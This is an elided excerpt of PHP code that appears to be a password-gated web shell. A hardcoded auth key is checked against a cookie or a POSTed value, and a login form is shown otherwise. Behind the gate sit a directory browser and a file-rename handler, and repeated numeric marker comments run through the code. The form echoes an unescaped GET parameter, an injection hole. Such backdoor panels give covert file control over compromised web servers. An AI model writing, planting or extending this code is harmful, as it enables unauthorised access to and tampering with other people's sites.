...
$auth_key = "48476fb43308b88ea536539d87ae20fe";
...
$pass = false;
if (isset($_COOKIE['pw_name_65510'])) {
    if(($_COOKIE['pw_name_65510']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_65510'])) {
        if(($_POST['pw_name_65510']) == $auth_key) {
            setcookie("pw_name_65510", $_POST['pw_name_65510']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_65510' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1739491997380044 1739491997405047 1739491997404117 1739491997914842
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1739491997380044 1739491997405047 1739491997404117 1739491997914842
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1739491997380044 1739491997405047 1739491997404117 1739491997914842
            $name = PATH . "/" . $_GET['r'];
